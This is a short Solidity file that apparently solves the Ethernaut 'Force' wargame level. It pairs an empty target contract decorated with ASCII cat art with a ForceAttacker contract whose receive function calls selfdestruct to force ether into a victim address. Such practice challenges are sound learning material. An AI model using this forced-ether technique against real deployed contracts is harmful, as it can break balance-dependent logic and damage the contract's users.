// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttacker {
  address _victim;

  constructor(address victim_) {
    _victim = victim_;
  }

  //   function attack() external {}

  receive() external payable {
    selfdestruct(payable(_victim));
  }
}
